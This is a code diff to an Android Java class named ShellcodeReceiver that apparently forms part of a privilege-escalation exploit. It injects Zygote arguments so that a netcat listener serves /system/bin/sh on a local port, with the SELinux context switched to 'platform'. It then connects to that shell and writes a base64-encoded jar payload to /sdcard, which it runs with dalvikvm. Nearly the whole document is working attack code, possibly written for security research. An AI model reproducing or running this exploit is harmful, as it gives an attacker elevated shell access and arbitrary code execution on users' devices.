@@ -12,15 +12,22 @@ import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.FileOutputStream;
+import java.io.PrintWriter;
+import java.net.Socket;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.lang.reflect.Method;
 import java.util.List;
 import java.util.Arrays;
+import java.util.Base64;
 
 public class ShellcodeReceiver extends BroadcastReceiver {
     String dataDir;
+    // bytes of jar which will be run in other selinux context
+    byte[] jarPayload;
+    // bytes of exploit binary which will be run
+    byte[] exploit;
 
     @Override
     public void onReceive(Context context, Intent intent) {
@@ -34,6 +41,8 @@ public class ShellcodeReceiver extends BroadcastReceiver {
         }
 
         dataDir = intent.getExtras().getString("data");
+        jarPayload = intent.getExtras().getByteArray("jar");
+        exploit = intent.getExtras().getByteArray("exploit");
 
         // ADDED: run command in new thread (avoid potentially blocking, which could mess up stuff? prob not needed)
         new Thread(this::runExploit).start();
@@ -74,13 +83,15 @@ public class ShellcodeReceiver extends BroadcastReceiver {
                 "--target-sdk-version=29",
                 "--setgroups=3003",
                 "--nice-name=runnetcat",
-                "--seinfo=network_stack:privapp:targetSdkVersion=29:complete",
+                "--seinfo=platform:privapp:targetSdkVersion=29:complete",
                 "--invoke-with",
                 "toybox nc -s 127.0.0.1 -p 1234 -L /system/bin/sh -l;",
                 "--instruction-set=arm",
                 "--app-data-dir=/data/",
                 "--package-name=com.android.settings",
                 "android.app.ActivityThread"
+                // "--package-name=com.example.leakvalue",
+                // "com.example.ZygoteRunner"
         );
 
         StringBuilder argStrBuilder = new StringBuilder();
@@ -161,6 +172,39 @@ public class ShellcodeReceiver extends BroadcastReceiver {
         } catch (IOException e) {
             throw new RuntimeException(e);
         }
+
+        Log.i("MainActivity", "waiting for shell...");
+        try {
+            Thread.sleep(10 * 1000);
+        } catch (InterruptedException e) {
+            Log.e("MainActivity", "Interrupted");
+        }
+
+        Log.i("MainActivity", "attempting to connect to shell...");
+        String HOST = "127.0.0.1";
+        int PORT = 1234;
+        try (Socket socket = new Socket(HOST, PORT);
+            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
+            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {
+
+            Log.d("Main Activity", "Connected to " + HOST + ":" + PORT);
+
+            // send a message
+            out.println("sleep 1000");
+
+            String base64Jar = Base64.getEncoder().encodeToString(jarPayload);
+            String command = "echo " + base64Jar +  " | base64 -d > /sdcard/runner.jar; dalvikvm -cp /sdcard/runner.jar xyz.cygnusx.runner.RunnerMain 2>&1"
+            out.println(command);
+            out.flush();
+
+            // read a response
+            // String response = in.readLine();
+            // Log.d(TAG, "Server response: " + response);
+
+        } catch (Exception e) {
+            Log.e("MainActivity", "Socket error", e);
+        }
+
 
         // String poc = "bad_io_uring.so";
 
